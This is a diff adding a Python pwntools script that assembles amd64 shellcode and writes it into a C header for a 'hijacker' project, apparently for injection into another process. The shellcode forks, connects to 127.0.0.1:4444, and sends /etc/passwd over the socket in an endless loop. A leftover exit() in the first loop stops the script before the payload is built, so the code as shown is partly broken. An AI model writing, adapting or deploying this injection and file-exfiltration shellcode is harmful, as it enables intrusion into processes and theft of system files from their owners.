@@ -1,0 +1,147 @@
+from pwn import *
+
+context.arch = 'amd64'
+
+flags = ["/etc/passwd", "/etc/hosts"]
+file_sc = []
+
+for flag in flags:
+    aux = shellcraft.amd64.linux.readfile(flag, "rbp")
+    aux += '    sub rsp, 48\n'
+    print(aux)
+    exit()
+
+
+child = '''/* open new socket */
+    /* call socket('AF_INET', SOCK_STREAM (1), 0) */
+    push SYS_socket /* 0x29 */
+    pop rax
+    push AF_INET /* 2 */
+    pop rdi
+    push SOCK_STREAM /* 1 */
+    pop rsi
+    cdq /* rdx=0 */
+    syscall
+
+
+    /* Put socket into rbp */
+    mov rbp, rax
+
+    /* Create address structure on stack */
+    /* push b'\x02\x00\x11\\\x7f\x00\x00\x01' */
+    mov rax, 0x201010101010101
+    push rax
+    mov rax, 0x201010101010101 ^ 0x100007f5c110002
+    xor [rsp], rax
+
+    /* Connect the socket */
+    /* call connect('rbp', 'rsp', 0x10) */
+    push SYS_connect /* 0x2a */
+    pop rax
+    mov rdi, rbp
+    push 0x10
+    pop rdx
+    mov rsi, rsp
+    syscall
+    /* Check if connect was successful */
+    cmp rax, 0
+    jl error
+
+    /* Save destination */
+    mov r8, rax
+
+    /* push b'/etc/passwd\x00' */
+    push 0x1010101 ^ 0x647773
+    xor dword ptr [rsp], 0x1010101
+    mov rax, 0x7361702f6374652f
+    push rax
+
+    /* call open('rsp', 'O_RDONLY') */
+    push SYS_open /* 2 */
+    pop rax
+    mov rdi, rsp
+    xor esi, esi /* O_RDONLY */
+    syscall
+
+    /* Save file descriptor for later */
+    mov rbx, rax
+
+    /* call fstat('rax', 'rsp') */
+    mov rdi, rax
+    push SYS_fstat /* 5 */
+    pop rax
+    mov rsi, rsp
+    syscall
+
+    /* Get file size */
+    add rsp, 48
+    mov rdx, [rsp]
+
+    /* call sendfile('r8', 'rbx', 0, 'rdx') */
+    mov r10, rdx
+    push SYS_sendfile /* 0x28 */
+    pop rax
+    mov rdi, rbp
+    mov rsi, rbx
+    cdq /* rdx=0 */
+    syscall
+
+    /* close file */
+    mov rax, 3
+    mov rdi, rbx
+    syscall
+
+    /* close socket */
+    mov rax, 3
+    mov rdi, rbp
+    syscall
+
+    /* restore stack */
+    sub rsp, 48'''
+
+error = '''/* close socket */
+mov rax, 3
+mov rdi, rbp
+syscall
+
+pop rsi
+jmp child
+'''
+
+
+payload = f'''
+/* call fork */
+mov rax, 0x39
+syscall
+
+/* check if we are the child */
+cmp rax, 0
+je child
+int3
+
+child:
+/* create an infinite loop that constantly sends the file */
+{child}
+jmp child
+
+error:
+{error}
+'''
+
+print(payload)
+# exit()
+
+aux = asm(payload)
+# aux += asm("int3")
+aux += b"\x90" * (8 - len(aux) % 8)
+
+f = open("../hijacker/shellcode.h", "w")
+f.write("char *shellcode = \"")
+
+for i in range(0, len(aux)):
+    f.write("\\x%02x" % aux[i])
+
+f.write("\";\n\n")
+f.write(f"int shellcode_len = {len(aux)};\n")
+print()
+print(f"Payload length: {len(aux)}")
